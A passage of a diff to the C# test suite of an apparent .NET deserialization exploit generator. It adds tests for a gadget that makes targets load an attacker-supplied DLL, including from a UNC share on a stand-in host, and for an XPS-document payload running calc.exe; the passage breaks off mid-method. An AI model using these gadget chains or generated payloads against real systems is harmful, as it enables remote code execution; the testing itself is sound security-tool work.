@@ -138,6 +138,13 @@ namespace ysonet.Tests
             Run("DataViewManagerXxe --minify keeps the DOCTYPE and the parameter entity", DataViewManagerXxeMinifyKeepsTheDoctype);
             Run("DataViewManagerXxe declares a remote URL input and a network kind", DataViewManagerXxeDeclaresUrlInputAndNetworkKind);
             Run("DataViewManagerXxe advertises only setter-calling formatters", DataViewManagerXxeAdvertisesOnlySetterFormatters);
+            Run("AssemblyInstallerLoad carries the loader chain on every formatter and carrier", AssemblyInstallerLoadCarriesTheRealChain);
+            Run("AssemblyInstallerLoad validates the DLL path, the variant and the carrier", AssemblyInstallerLoadValidatesTheDllPath);
+            Run("AssemblyInstallerLoad delivers an awkward path unchanged on every formatter", AssemblyInstallerLoadEscapesOperatorPaths);
+            Run("AssemblyInstallerLoad declares a local and a UNC capability", AssemblyInstallerLoadDeclaresItsVariantFacets);
+            Run("AssemblyInstallerLoad refuses -t before it touches the path", AssemblyInstallerLoadRefusesSelfTest);
+            Run("AssemblyInstallerLoad generation never loads the DLL", AssemblyInstallerLoadGenerationIsInert);
+            Run("AssemblyInstallerLoad info panel still shows its facts", AssemblyInstallerLoadInfoPanelStillShowsItsFacts);
             Run("TempFileCollection rebuilds the real type and its four delete fields", TempFileCollectionCarriesTheRealTypeAndFields);
             Run("TempFileCollection collects -c plus repeated --extrafile and touches no path", TempFileCollectionOptionParsing);
             Run("TempFileCollection keeps UNC and relative target paths verbatim", TempFileCollectionKeepsUncAndRelativePathsVerbatim);
@@ -177,6 +184,7 @@ namespace ysonet.Tests
             Run("Plugin modes drive which settings show, are required, and are passed", PluginModesDriveOptions);
             Run("DotNetNuke modes select the payload mode and pass the right args", DotNetNukeModes);
             Run("Clipboard modes scope format vs xamlvariant per mode", ClipboardModes);
+            Run("Xps modes choose which markup part carries the payload", XpsModes);
             Run("SharePoint modes select the CVE and scope its inner setting", SharePointModes);
             Run("SharePoint CVE-2026-50522 default output is the wresult token plus a delivery comment", SharePointCve2026Framing);
             Run("SharePoint CVE-2026-50522 --formbody emits the full wa/wctx/wresult body", SharePointCve2026FormBody);
@@ -217,6 +225,9 @@ namespace ysonet.Tests
             Run("Clipboard plugin exposes the wpfxaml mode options", ClipboardWpfXamlOptions);
             Run("Clipboard payloads actually trigger (winforms + wpfxaml variants)", ClipboardPayloadsTrigger);
             Run("Restrictive XAML load blocks the ObjectDataProvider gadget", RestrictiveXamlBlocksGadget);
+            Run("Xps builds a real XPS package with the payload in the chosen part", XpsPackageStructure);
+            Run("Xps rejects an unknown part mode and an empty command", XpsRejectsBadInput);
+            Run("Xps options do not leak between in-process runs", XpsOptionsDoNotLeak);
             Run("Option help renders without hanging for every plugin and gadget", OptionHelpNeverHangs);
             Run("SoftBreak wraps over-long help tokens (NDesk hang guard)", SoftBreakWrapsLongTokens);
             Run("XmlMinifier strips soap encodingStyle without O(n^2) backtracking", XmlMinifierEncodingStyle);
@@ -231,6 +242,7 @@ namespace ysonet.Tests
             Run("DataSetOldBehaviourFromFile --compressed shrinks via a GZip payload chain", DataSetFromFileCompressedIsSmaller);
             Run("Non-RCE payloads are first-class gadgets with accurate inputs and facets", NonRcePayloadsAreGadgets);
             Run("Non-RCE gadget payloads are minified with --minify", NonRcePayloadsMinify);
+            Run("MessagePack Typeless payloads carry the target type names, not the surrogates'", MessagePackTypelessCarriesTargetTypeNames);
             Run("Every gadget generates a non-empty payload from valid inputs", EveryGadgetGeneratesAPayload);
             Run("Every safe plugin generates a payload; the rest are explicitly excluded", EverySafePluginGeneratesAPayload);
 
@@ -3252,6 +3264,483 @@ namespace ysonet.Tests
                 "DataViewManager is not [Serializable], which rules out the runtime formatters");
         }
 
+        // ---- AssemblyInstallerLoad ---------------------------------------------
+
+        private const string AiGadget = "AssemblyInstallerLoad";
+
+        // Every formatter the gadget advertises, in the same order, without the "(N)"
+        // variant annotation the catalog carries.
+        private static readonly string[] AiFormatters =
+        {
+            "Json.NET", "Xaml", "FastJson", "JavaScriptSerializer", "YamlDotNet",
+            "SharpSerializerBinary", "SharpSerializerXml",
+            "MessagePackTypeless", "MessagePackTypelessLz4",
+        };
+
+        // The two formatters that can also build the three list carriers, because both can
+        // add to a read-only Items collection instead of assigning it.
+        private static readonly string[] AiMultiCarrierFormatters = { "Json.NET", "Xaml" };
+
+        private static readonly string[] AiCarrierNames =
+        {
+            "", "PropertyGrid", "ComboBox", "ListBox", "CheckedListBox"
+        };
+
+        // A local path that is never opened: the gadget treats -c as TARGET data.
+        private const string AiLocalDll = @"C:\programdata\ysonet-test\installer.dll";
+        private const string AiUncDll = @"\\ysonet-nonexistent-host\share\installer.dll";
+
+        private static RunResult GenerateAssemblyInstaller(string formatter, int variant, int getter,
+            bool minify, string path)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = path;
+            ia.Minify = minify;
+            ia.Test = false;
+            ia.ExtraArguments = new List<string>
+            {
+                "--variant", variant.ToString(), "--getter", getter.ToString()
+            };
+            return PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = AiGadget,
+                FormatterName = formatter,
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+        }
+
+        // The payload as searchable text. The two binary outputs still carry the type names
+        // and the path as plain UTF-8 records, so a text search is valid evidence there too.
+        private static string AiPayloadText(object raw)
+        {
+            string text = raw as string;
+            if (text != null) return text;
+            byte[] bytes = raw as byte[];
+            return bytes == null ? null : new UTF8Encoding(false).GetString(bytes);
+        }
+
+        // The integrity check: every advertised formatter, variant and carrier must really
+        // name the AssemblyInstaller carrier, set Path, and reach the getter that runs the
+        // installers. Generation returning bytes proves none of that on its own.
+        private static void AssemblyInstallerLoadCarriesTheRealChain()
+        {
+            foreach (string formatter in AiFormatters)
+            {
+                for (int variant = 1; variant <= 2; variant++)
+                {
+                    string path = variant == 2 ? AiUncDll : AiLocalDll;
+                    for (int m = 0; m < 2; m++)
+                    {
+                        bool minify = m == 1;
+                        string cell = formatter + " v" + variant + (minify ? " --minify" : "");
+
+                        RunResult r = GenerateAssemblyInstaller(formatter, variant, 1, minify, path);
+                        AssertTrue(r.Success, cell + " generates: " + r.ErrorMessage);
+
+                        string text = AiPayloadText(r.Raw);
+                        AssertTrue(text != null, cell + ": payload is text or bytes");
+
+                        // The Lz4 flavour is COMPRESSED, so no name or path is readable in
+                        // the bytes. Its uncompressed twin above carries the identical graph
+                        // and is asserted in full; here only the shape can be checked, and
+                        // the runtime proof is its cell in the FULL execution matrix.
+                        if (formatter == "MessagePackTypelessLz4")
+                        {
+                            AssertTrue(((byte[])r.Raw).Length > 0, cell + ": produces a non-empty payload");
+                            continue;
+                        }
+
+                        // XAML names the type as an element plus a clr-namespace; every
+                        // other formatter carries the assembly-qualified name. The namespace
+                        // PREFIX is not asserted: --minify renames it (ci -> a), which is
+                        // the minifier doing its job.
+                        if (formatter == "Xaml")
+                            AssertTrue(text.IndexOf(":AssemblyInstaller ", StringComparison.Ordinal) >= 0
+                                    && text.IndexOf("clr-namespace:System.Configuration.Install;assembly=System.Configuration.Install", StringComparison.Ordinal) >= 0,
+                                cell + ": names the AssemblyInstaller carrier");
+                        else
+                            AssertTrue(text.IndexOf("System.Configuration.Install.AssemblyInstaller", StringComparison.Ordinal) >= 0,
+                                cell + ": names the AssemblyInstaller carrier");
+
+                        AssertTrue(text.IndexOf("System.Windows.Forms.PropertyGrid", StringComparison.Ordinal) >= 0
+                                || text.IndexOf("<PropertyGrid ", StringComparison.Ordinal) >= 0,
+                            cell + ": names the PropertyGrid getter carrier");
+                        AssertTrue(text.IndexOf("SelectedObject", StringComparison.Ordinal) >= 0,
+                            cell + ": assigns the PropertyGrid selection, which is what reads the getter");
+                        AssertTrue(text.IndexOf("Path", StringComparison.Ordinal) >= 0,
+                            cell + ": sets the Path property, whose setter calls Assembly.LoadFrom");
+
+                        // A surrogate name in the emitted bytes would mean the type swap
+                        // silently failed: the payload still generates and is still valid,
+                        // but no target could resolve it.
+                        AssertTrue(text.IndexOf("Surrogate", StringComparison.Ordinal) < 0,
+                            cell + ": leaks no ysonet surrogate type name");
+
+                        // The operator's path must survive the template and the minifier
+                        // exactly, or the target loads a different file.
+                        AssertTrue(AiDecode(formatter, text).IndexOf(path, StringComparison.Ordinal) >= 0,
+                            cell + ": carries the DLL path verbatim");
+                    }
+                }
+            }
+
+            // The three list carriers, on the two formatters that can build them.
+            foreach (string formatter in AiMultiCarrierFormatters)
+            {
+                for (int getter = 2; getter <= 4; getter++)
+                {
+                    for (int m = 0; m < 2; m++)
+                    {
+                        bool minify = m == 1;
+                        string carrier = AiCarrierNames[getter];
+                        string cell = formatter + " --getter " + getter + (minify ? " --minify" : "");
+
+                        RunResult r = GenerateAssemblyInstaller(formatter, 1, getter, minify, AiLocalDll);
+                        AssertTrue(r.Success, cell + " generates: " + r.ErrorMessage);
+
+                        string text = AiPayloadText(r.Raw);
+                        AssertTrue(text.IndexOf(carrier, StringComparison.Ordinal) >= 0,
+                            cell + ": names the " + carrier + " carrier");
+                        // DisplayMember is what makes a list control read HelpText on each
+                        // item; without it nothing calls the getter at all.
+                        AssertTrue(text.IndexOf("DisplayMember", StringComparison.Ordinal) >= 0
+                                && text.IndexOf("HelpText", StringComparison.Ordinal) >= 0,
+                            cell + ": points DisplayMember at HelpText");
+                        AssertTrue(AiDecode(formatter, text).IndexOf(AiLocalDll, StringComparison.Ordinal) >= 0,
+                            cell + ": carries the DLL path verbatim");
+                    }
+                }
+            }
+        }
+
+        // Undo only the escaping the payload template applied, so a path assertion compares
+        // against what the target will really hand to Assembly.LoadFrom.
+        private static string AiDecode(string formatter, string payload)
+        {
+            if (formatter == "Xaml" || formatter == "SharpSerializerXml")
+                return payload.Replace("&#x22;", "\"").Replace("&quot;", "\"")
+                              .Replace("&lt;", "<").Replace("&gt;", ">").Replace("&amp;", "&");
+            if (formatter == "Json.NET" || formatter == "JavaScriptSerializer"
+                || formatter == "FastJson" || formatter == "YamlDotNet")
+                return payload.Replace("\\\"", "\"").Replace("\\\\", "\\");
+            return payload;   // the two binary formats store the string verbatim
+        }
+
+        // -c is TARGET data and the two variants promise different delivery, so the gadget
+        // has to say no to the combinations that would build a payload that cannot work.
+        private static void AssemblyInstallerLoadValidatesTheDllPath()
+        {
+            foreach (string bad in new[] { null, "", "   " })
+            {
+                RunResult r = GenerateAssemblyInstaller("Json.NET", 1, 1, false, bad);
+                AssertTrue(!r.Success, "rejects an empty -c ('" + (bad ?? "<null>") + "')");
+                AssertTrue((r.ErrorMessage ?? "").IndexOf("installer DLL", StringComparison.OrdinalIgnoreCase) >= 0,
+                    "the empty -c message says what is wanted: " + r.ErrorMessage);
+            }
+
+            // The sink is Assembly.LoadFrom, so a managed .exe is as valid as a .dll; a
+            // source file is not, and neither is a bare program name, which is the shape a
+            // shell command would arrive in.
+            RunResult wrongExt = GenerateAssemblyInstaller("Json.NET", 1, 1, false, @"C:\x\ExploitClass.cs");
+            AssertTrue(!wrongExt.Success, "rejects a path that is not a loadable assembly");
+            AssertTrue((wrongExt.ErrorMessage ?? "").IndexOf(".dll", StringComparison.Ordinal) >= 0,
+                "the wrong-extension message names .dll: " + wrongExt.ErrorMessage);
+
+            RunResult bareName = GenerateAssemblyInstaller("Json.NET", 1, 1, false, "calc.exe");
+            AssertTrue(!bareName.Success, "rejects a bare program name that only looks like an assembly");
+            AssertTrue((bareName.ErrorMessage ?? "").IndexOf("bare file name", StringComparison.Ordinal) >= 0,
+                "the bare-name message explains the problem: " + bareName.ErrorMessage);
+
+            RunResult exePath = GenerateAssemblyInstaller("Json.NET", 1, 1, false, @"C:\programdata\ysonet-test\installer.exe");
+            AssertTrue(exePath.Success, "accepts a managed .exe, which Assembly.LoadFrom loads: " + exePath.ErrorMessage);
+
+            // Characters Windows does not allow in a path, and that would also have to
+            // survive a JSON string, an XML attribute and a YAML scalar.
+            foreach (string bad in new[] { "C:\\a\"b\\x.dll", "C:\\a<b\\x.dll", "C:\\a>b\\x.dll",
+                                           "C:\\a|b\\x.dll", "C:\\a*b\\x.dll", "C:\\a?b\\x.dll",
+                                           "C:\\a\nb\\x.dll" })
+            {
+                RunResult r = GenerateAssemblyInstaller("Json.NET", 1, 1, false, bad);
+                AssertTrue(!r.Success, "rejects an illegal path character in " + bad.Replace("\n", "\\n"));
+            }
+
+            // The variants are not decoration: each refuses the other's input and names the
+            // one to use, so a mislabelled payload can never be produced.
+            RunResult localOnV2 = GenerateAssemblyInstaller("Json.NET", 2, 1, false, AiLocalDll);
+            AssertTrue(!localOnV2.Success, "variant 2 rejects a local path");
+            AssertTrue((localOnV2.ErrorMessage ?? "").IndexOf("variant 1", StringComparison.OrdinalIgnoreCase) >= 0,
+                "variant 2's refusal points at variant 1: " + localOnV2.ErrorMessage);
+
+            RunResult uncOnV1 = GenerateAssemblyInstaller("Json.NET", 1, 1, false, AiUncDll);
+            AssertTrue(!uncOnV1.Success, "variant 1 rejects a UNC path");
+            AssertTrue((uncOnV1.ErrorMessage ?? "").IndexOf("variant 2", StringComparison.OrdinalIgnoreCase) >= 0,
+                "variant 1's refusal points at variant 2: " + uncOnV1.ErrorMessage);
+
+            // Surrounding whitespace is trimmed rather than baked into the payload.
+            RunResult trimmed = GenerateAssemblyInstaller("Json.NET", 1, 1, false, "  " + AiLocalDll + "  ");
+            AssertTrue(trimmed.Success, "trims surrounding whitespace: " + trimmed.ErrorMessage);
+            AssertTrue(AiDecode("Json.NET", AiPayloadText(trimmed.Raw))
+                    .IndexOf("\"" + AiLocalDll + "\"", StringComparison.Ordinal) >= 0,
+                "the trimmed path is what reaches the payload");
+
+            // A carrier the formatter cannot build must be refused, not silently downgraded:
+            // ComboBox/ListBox/CheckedListBox expose Items without a setter, so every
+            // formatter except Json.NET and Xaml would deserialize it EMPTY and never read
+            // HelpText, which looks like a working payload and does nothing.
+            foreach (string formatter in AiFormatters)
+            {
+                bool multiCarrier = Array.IndexOf(AiMultiCarrierFormatters, formatter) >= 0;
+                for (int getter = 2; getter <= 4; getter++)
+                {
+                    RunResult r = GenerateAssemblyInstaller(formatter, 1, getter, false, AiLocalDll);
+                    if (multiCarrier)
+                    {
+                        AssertTrue(r.Success, formatter + " builds carrier " + getter + ": " + r.ErrorMessage);
+                    }
+                    else
+                    {
+                        AssertTrue(!r.Success, formatter + " must refuse carrier " + getter);
+                        AssertTrue((r.ErrorMessage ?? "").IndexOf("PropertyGrid", StringComparison.Ordinal) >= 0,
+                            formatter + "'s refusal names the carrier that does work: " + r.ErrorMessage);
+                    }
+                }
+            }
+
+            foreach (int bad in new[] { 0, 5 })
+            {
+                RunResult r = GenerateAssemblyInstaller("Json.NET", 1, bad, false, AiLocalDll);
+                AssertTrue(!r.Success, "rejects --getter " + bad);
+            }
+        }
+
+        // The DLL path is operator data the target uses literally. It travels through a JSON
+        // string, a YAML scalar, an XML attribute and two binary streams, and --minify
+        // rewrites two of those, so a path holding the characters that stress each layer has
+        // to come out byte-identical on every formatter.
+        //
+        // The apostrophe is the regression that motivates this: the shared JsonStringEscape
+        // writes it as \', which is not a legal JSON escape - Json.NET and
+        // JavaScriptSerializer read it back as a quote, but fastJSON DELETES the character,
+        // silently turning C:\John's dir\x.dll into C:\Johns dir\x.dll.
+        private static void AssemblyInstallerLoadEscapesOperatorPaths()
+        {
+            string[] awkward =
+            {
+                @"C:\John's dir\installer.dll",     // apostrophe: the fastJSON case
+                @"C:\a & b\installer.dll",          // ampersand: XML entity
+                @"C:\two  spaces\installer.dll",    // interior double space
+                @"C:\semi; colon\installer.dll",    // "; " is what the XML minifier collapses
+            };
+
+            foreach (string path in awkward)
+            {
+                foreach (string formatter in AiFormatters)
+                {
+                    for (int m = 0; m < 2; m++)
+                    {
+                        bool minify = m == 1;
+                        string cell = formatter + (minify ? " --minify" : "") + " with " + path;
+
+                        RunResult r = GenerateAssemblyInstaller(formatter, 1, 1, minify, path);
+
+                        // A minifier really can rewrite these: the XML one collapses "; "
+                        // inside an attribute, the YAML one collapses a run of spaces. The
+                        // gadget must then REFUSE, never ship a payload naming a different
+                        // file. Either outcome is correct; a rewritten path is not.
+                        if (!r.Success)
+                        {
+                            AssertTrue((r.ErrorMessage ?? "").IndexOf("no longer carries", StringComparison.Ordinal) >= 0,
+                                cell + " failed for an unexpected reason: " + r.ErrorMessage);
+                            AssertTrue(minify, cell + " was refused without --minify, which nothing should rewrite");
+                            Console.Error.WriteLine("  [info] " + cell + " is refused: " + r.ErrorMessage);
+                            continue;
+                        }
+
+                        // Compressed output carries no readable text; its uncompressed twin
+                        // covers the same graph.
+                        if (formatter == "MessagePackTypelessLz4")
+                            continue;
+
+                        AssertTrue(AiDecode(formatter, AiPayloadText(r.Raw)).IndexOf(path, StringComparison.Ordinal) >= 0,
+                            cell + ": the path arrives unchanged");
+                    }
+                }
+            }
+        }
+
+        // The two variants exist to describe two different deliveries, so the category
+        // search has to see the difference.
+        private static void AssemblyInstallerLoadDeclaresItsVariantFacets()
+        {
+            IGenerator g = GadgetRegistry.CreateGadgetInstance(AiGadget);
+            AssertTrue(g != null, AiGadget + " is discoverable in the registry");
+            AssertEqual(CommandInputType.DllPath, g.CommandInput(), "-c is a DLL path by default");
+
+            List<GadgetVariant> variants = g.Variants();
+            AssertEqual(2, variants.Count, "declares two variants");
+            AssertEqual(CommandInputType.DllPath, variants[0].EffectiveInput(g.CommandInput()),
+                "variant 1 takes a target-local DLL path");
+            AssertEqual(CommandInputType.UncPath, variants[1].EffectiveInput(g.CommandInput()),
+                "variant 2 takes a UNC path");
+
+            List<GadgetCapability> caps = GadgetFacetReader.Expand(g);
+            AssertEqual(2, caps.Count, "two variants expand to two capability units");
+
+            GadgetCapability local = caps[0], unc = caps[1];
+
+            AssertTrue(local.Kinds.Contains(PayloadKind.CodeExecution),
+                "variant 1 is code execution: the installer constructor runs");
+            AssertTrue(!local.Kinds.Contains(PayloadKind.Network),
+                "variant 1 makes no network claim: the path is already on the target");
+            AssertTrue(local.Inputs.Contains(PayloadInput.AssemblyFile),
+                "variant 1's derived accepted input is assembly-file");
+            AssertTrue(!local.Inputs.Contains(PayloadInput.UncPath),
+                "variant 1 does not advertise a UNC path");
+
+            AssertTrue(unc.Kinds.Contains(PayloadKind.CodeExecution)
+                    && unc.Kinds.Contains(PayloadKind.Network),
+                "variant 2 is code execution AND network: the target fetches the DLL over SMB");
+            AssertTrue(unc.Inputs.Contains(PayloadInput.UncPath),
+                "variant 2's derived accepted input is unc-path");
+
+            foreach (GadgetCapability cap in caps)
+            {
+                AssertTrue(cap.Requirements.Contains(GadgetRequirement.BuiltIn)
+                        && cap.Requirements.Contains(GadgetRequirement.NetFramework),
+                    "needs only built-in .NET Framework types");
+                // The real gate is the target's security zone for the share plus
+                // loadFromRemoteSources, not a CLR build, so the version axis stays honest.
+                AssertEqual(1, cap.Versions.Count, "declares one value on the version axis");
+                AssertTrue(cap.Versions.Contains(RuntimeVersion.Unspecified),
+                    "leaves the runtime version axis unspecified");
+            }
+
+            AssertTrue(g.AdditionalInfo().IndexOf("RunInstaller", StringComparison.Ordinal) >= 0,
+                "AdditionalInfo names the [RunInstaller(true)] requirement the DLL has to meet");
+            AssertTrue(g.Labels().Contains(GadgetTags.GetterChain),
+                "labelled as a getter chain");
+        }
+
+        // -t deserializes the payload in THIS process, which for this gadget means loading
+        // the operator's DLL and running its installer constructors on the operator's own
+        // machine. It must refuse, and it must refuse BEFORE it does anything with the path.
+        private static void AssemblyInstallerLoadRefusesSelfTest()
+        {
+            foreach (string formatter in AiFormatters)
+            {
+                InputArgs ia = new InputArgs();
+                ia.Cmd = AiLocalDll;
+                ia.Test = true;
+                RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
+                {
+                    GadgetName = AiGadget,
+                    FormatterName = formatter,
+                    OutputFormat = "",
+                    InputArgs = ia,
+                });
+                AssertTrue(!r.Success, formatter + ": -t is refused");
+                AssertTrue((r.ErrorMessage ?? "").IndexOf("refuses -t", StringComparison.Ordinal) >= 0,
+                    formatter + ": the refusal says so plainly: " + r.ErrorMessage);
+            }
+
+            // Refused BEFORE the path is looked at: an input that would fail validation
+            // still comes back with the -t refusal, which is the ordering proof.
+            InputArgs bad = new InputArgs();
+            bad.Cmd = "";
+            bad.Test = true;
+            RunResult ordering = PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = AiGadget,
+                FormatterName = "Json.NET",
+                OutputFormat = "",
+                InputArgs = bad,
+            });
+            AssertTrue(!ordering.Success, "still refuses with an empty -c");
+            AssertTrue((ordering.ErrorMessage ?? "").IndexOf("refuses -t", StringComparison.Ordinal) >= 0,
+                "-t is refused before the input is even validated: " + ordering.ErrorMessage);
+        }
+
+        // Building a payload must never load the DLL. The fixture installer writes a marker
+        // when it is constructed, so pointing generation at the test assembly and finding no
+        // marker proves generation alone is inert on every branch.
+        private static void AssemblyInstallerLoadGenerationIsInert()
+        {
+            string marker = TestArtifactPath("ysonet_installer_inert.txt");
+            SafeDelete(marker);
+            string previous = Environment.GetEnvironmentVariable(YsonetTestInstaller.MarkerVariable);
+            Environment.SetEnvironmentVariable(YsonetTestInstaller.MarkerVariable, marker);
+            try
+            {
+                string ownAssembly = AiFixtureAssemblyPath();
+                int cells = 0;
+                foreach (string formatter in AiFormatters)
+                {
+                    int maxGetter = Array.IndexOf(AiMultiCarrierFormatters, formatter) >= 0 ? 4 : 1;
+                    for (int getter = 1; getter <= maxGetter; getter++)
+                        for (int m = 0; m < 2; m++)
+                        {
+                            RunResult r = GenerateAssemblyInstaller(formatter, 1, getter, m == 1, ownAssembly);
+                            AssertTrue(r.Success, formatter + " g" + getter + " generates: " + r.ErrorMessage);
+                            cells++;
+                        }
+                }
+                AssertTrue(cells > 20, "covered every generation branch (was " + cells + ")");
+                AssertTrue(!File.Exists(marker),
+                    "generation alone never loaded the DLL: no installer was constructed");
+            }
+            finally
+            {
+                Environment.SetEnvironmentVariable(YsonetTestInstaller.MarkerVariable, previous);
+                SafeDelete(marker);
+            }
+        }
+
+        // AdditionalInfo() is the FIRST block of the interactive info panel and the panel
+        // only renders BodyRows lines, so a long one silently pushes Formatters:, Command
+        // input: and the category summary off the visible area. The shared canary
+        // (ModuleInfoPanelShowsFacts) only guards the FIRST gadget alphabetically, and this
+        // gadget has both a long formatter list and preconditions worth stating, which is
+        // exactly the combination that grows. So check its own panel.
+        private static void AssemblyInstallerLoadInfoPanelStillShowsItsFacts()
+        {
+            var ed = new ModuleEditor(null, null, true, null, null);
+            // A pessimistically NARROW info column: the panel is one of four columns, so a
+            // realistic terminal gives it more room than this.
+            string[] lines = ed.ModuleInfoLinesForTest(AiGadget, 34);
+            int visible = ModuleEditor.BodyRowsForTest;
+            AssertTrue(lines.Length > 0, "the info panel renders for " + AiGadget);
+
+            foreach (string fact in new[] { "Formatters:", "Command input:", "Categories" })
+            {
+                int at = -1;
+                for (int i = 0; i < lines.Length; i++)
+                    if (lines[i].TrimStart().StartsWith(fact, StringComparison.Ordinal)) { at = i; break; }
+                AssertTrue(at >= 0, "the panel states " + fact);
+                AssertTrue(at < visible, fact + " is still on screen (row " + at + " of "
+                    + visible + " visible; shorten AdditionalInfo() and move the detail into "
+                    + "the option help)");
+            }
+
+            // Both selectors must reach the editor, or the gadget is only usable from the
+            // command line.
+            List<EditableField> fields = ed.BuildFieldsForTest(AiGadget);
+            foreach (string option in new[] { "variant", "getter" })
+            {
+                EditableField f = FindEditable(fields, option);
+                AssertTrue(f != null && !f.Hidden, "the editor offers the " + option + " setting");
+                AssertTrue(!string.IsNullOrEmpty(f.Help),
+                    "the " + option + " setting carries its help text into the editor");
+            }
+        }
+
+        // The already-built ysonet.Tests assembly, which holds the inert
+        // [RunInstaller(true)] fixture. Nothing is compiled at test time.
+        private static string AiFixtureAssemblyPath()
+        {
+            return new Uri(typeof(YsonetTestInstaller).Assembly.CodeBase).LocalPath;
+        }
+
         private static void TempFileCollectionKeepsUncAndRelativePathsVerbatim()
         {
             const string unc = @"\\ysonet-nonexistent-host\share\zz_target.txt";
@@ -5233,7 +5722,10 @@ namespace ysonet.Tests
         {
             AssertTrue(AnyFrame(DriveFrames(k => k.Escape()), "Build a gadget payload"), "top menu renders");
             AssertTrue(AnyFrame(DriveFrames(k => k.Enter().Enter().Escape().Escape().Escape()), "[ Generate and quit ]"), "gadget settings render");
-            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(2).Up().Enter().Escape().Escape().Escape()), "ViewState Settings"), "plugin settings render");
+            // Type-to-filter to the plugin by NAME. This used to press Up to land on the
+            // last plugin in the list, which silently meant "ViewState is last" and broke
+            // the moment a plugin sorting after it was added.
+            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(2).Type("ViewState").Enter().Escape().Escape().Escape()), "ViewState Settings"), "plugin settings render");
             AssertTrue(AnyFrame(DriveFrames(k => k.Digit(3).Type("Json").Enter().Enter().Escape()), "Gadgets with a formatter"), "search formatters renders");
             AssertTrue(AnyFrame(DriveFrames(k => k.Digit(4).Escape().Escape()), "What kind of input"), "run-all-formatters renders");
             AssertTrue(AnyFrame(DriveFrames(k => k.Digit(6).Enter().Escape()), "Pick 'gadget'"), "help renders");
@@ -5417,7 +5909,7 @@ namespace ysonet.Tests
             var gen = run(k => k.Enter().Type("ObjectDataProvider").Enter().Up().Up().Up().Up().Enter().Enter().Escape().Escape().Escape());
             show("GENERATE action output", gen, "Payload (", false);
 
-            var plugin = run(k => k.Digit(2).Up().Enter().Escape().Escape().Escape());
+            var plugin = run(k => k.Digit(2).Type("ViewState").Enter().Escape().Escape().Escape());
             show("PLUGIN SETTINGS (ViewState)", plugin, "ViewState Settings", false);
 
             var theme = run(k => k.Digit(7).Down().Down().Escape().Escape());
@@ -5576,6 +6068,147 @@ namespace ysonet.Tests
             AssertTrue(FindField(fields, "command") != null, "command option still present");
         }
 
+        // The Xps plugin's four interactive modes are the four markup parts the payload can
+        // ride in. Each must preset its own --mode value, because that is the only thing
+        // separating them; there is no per-mode option to show or hide.
+        private static void XpsModes()
+        {
+            var editor = new ModuleEditor(null, null, false, null, null);
+            var f = editor.BuildFieldsForTest("Xps");
+            EditableField mode = FindEditable(f, "mode");
+            AssertTrue(mode != null && mode.Choices.Count == 4, "four Xps part modes");
+
+            FindEditable(f, "command").Value = "calc.exe";
+            FindEditable(f, "command").Touched = true;
+
+            // Default is the start part, the classic CVE-2020-0605 shape.
+            string a1 = string.Join(" ", editor.PluginArgvForTest().ToArray());
+            AssertTrue(a1.Contains("--mode fdseq"), "default argv has the fdseq mode: " + a1);
+
+            // Every other mode maps to a value the CLI accepts.
+            var seen = new List<string>();
+            for (int i = 0; i < mode.Choices.Count; i++)
+            {
+                mode.Value = mode.Choices[i];
+                editor.RefreshDynamicForTest();
+                string argv = string.Join(" ", editor.PluginArgvForTest().ToArray());
+                foreach (string token in new[] { "fdseq", "fdoc", "fpage", "all" })
+                    if (argv.Contains("--mode " + token)) seen.Add(token);
+            }
+            AssertTrue(seen.Contains("fdseq") && seen.Contains("fdoc")
+                && seen.Contains("fpage") && seen.Contains("all"),
+                "the four modes produce the four --mode values: " + string.Join(",", seen.ToArray()));
+        }
+
+        // The generated file must be a real XPS package, not just a ZIP with markup in it:
+        // an application only reaches the XAML through the start part relationship and the
+        // XPS content types. This also pins WHICH part carries the gadget per mode, so a
+        // regression to "valid document, payload in the wrong place" fails loudly.
+        private static void XpsPackageStructure()
+        {
+            const string seqPart = "/FixedDocSeq.fdseq";
+            const string docPart = "/Documents/1/FixedDoc.fdoc";
+            const string pagePart = "/Documents/1/Pages/1.fpage";
+            const string startRel = "http://schemas.microsoft.com/xps/2005/06/fixedrepresentation";
+
+            var expectedTypes = new Dictionary<string, string>
+            {
+                { seqPart, "application/vnd.ms-package.xps-fixeddocumentsequence+xml" },
+                { docPart, "application/vnd.ms-package.xps-fixeddocument+xml" },
+                { pagePart, "application/vnd.ms-package.xps-fixedpage+xml" },
+            };
+
+            // mode -> the parts that must contain the gadget.
+            var payloadParts = new Dictionary<string, string[]>
+            {
+                { "fdseq", new[] { seqPart } },
+                { "fdoc", new[] { docPart } },
+                { "fpage", new[] { pagePart } },
+                { "all", new[] { seqPart, docPart, pagePart } },
+            };
+
+            foreach (KeyValuePair<string, string[]> kv in payloadParts)
+            {
+                string mode = kv.Key;
+                RunResult r = PayloadRunner.RunPlugin("Xps", new[] { "-m", mode, "-c", "calc.exe" });
+                AssertTrue(r.Success, "Xps -m " + mode + " runs: " + r.ErrorMessage);
+
+                byte[] bytes = Bytes(r.Raw);
+                AssertTrue(bytes != null && bytes.Length > 0, "Xps -m " + mode + " produced bytes");
+
+                var carriesPayload = new List<string>(kv.Value);
+
+                using (var ms = new MemoryStream(bytes))
+                using (System.IO.Packaging.Package package =
+                    System.IO.Packaging.Package.Open(ms, FileMode.Open, FileAccess.Read))
+                {
+                    // The start part relationship is what makes this an XPS document.
+                    bool startPartFound = false;
+                    foreach (System.IO.Packaging.PackageRelationship rel in package.GetRelationshipsByType(startRel))
+                        if (rel.TargetUri.ToString().TrimStart('/') == seqPart.TrimStart('/')) startPartFound = true;
+                    AssertTrue(startPartFound, "Xps -m " + mode + " has the start part relationship to " + seqPart);
+
+                    foreach (KeyValuePair<string, string> part in expectedTypes)
+                    {
+                        Uri uri = new Uri(part.Key, UriKind.Relative);
+                        AssertTrue(package.PartExists(uri), "Xps -m " + mode + " has part " + part.Key);
+
+                        System.IO.Packaging.PackagePart p = package.GetPart(uri);
+                        AssertTrue(p.ContentType.StartsWith(part.Value),
+                            "Xps -m " + mode + " part " + part.Key + " has content type " + part.Value
+                            + " (was " + p.ContentType + ")");
+
+                        string markup;
+                        using (Stream s = p.GetStream(FileMode.Open, FileAccess.Read))
+                        using (var reader = new StreamReader(s, Encoding.UTF8))
